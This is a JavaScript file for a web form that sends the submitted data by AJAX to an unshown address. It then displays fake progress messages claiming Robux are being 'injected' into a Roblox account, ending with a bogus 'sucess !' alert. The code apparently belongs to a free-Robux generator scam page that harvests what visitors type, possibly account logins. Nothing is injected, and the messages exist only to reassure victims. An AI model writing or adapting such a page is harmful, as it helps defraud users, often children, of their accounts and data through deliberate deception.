window.addEventListener("DOMContentLoaded", function () {
  // get the form elements defined in your form HTML above

  var form = document.getElementById("my-form");
  // var button = document.getElementById("my-form-button");
  var status = document.getElementById("status");

  // Success and Error functions for after the form is submitted

  function success() {
    form.reset();
    status.classList.add("success");
    status.innerHTML = "inject robux into account , sucesful .";
	 setTimeout(function(){ 
    alert('start injection...')
    }, 3000);
	 setTimeout(function(){ 
    alert('inject roblox.gz into robox.app')
    }, 3000);
	 setTimeout(function(){ 
    alert('inject roblox.bz2 into roblox.app')
    }, 3000);
	 setTimeout(function(){ 
    alert('sucess !')
    }, 5000);
  }

  function error() {
    status.classList.add("error");
    status.innerHTML = "error , try agains please";
  }

  // handle the form submission event

  form.addEventListener("submit", function (ev) {
    ev.preventDefault();
    var data = new FormData(form);
    ajax(form.method, form.action, data, success, error);
  });
});

// helper function for sending an AJAX request

function ajax(method, url, data, success, error) {
  var xhr = new XMLHttpRequest();
  xhr.open(method, url);
  xhr.setRequestHeader("Accept", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState !== XMLHttpRequest.DONE) return;
    if (xhr.status === 200) {
      success(xhr.response, xhr.responseType);
    } else {
      error(xhr.status, xhr.response, xhr.responseType);
    }
  };
  xhr.send(data);
}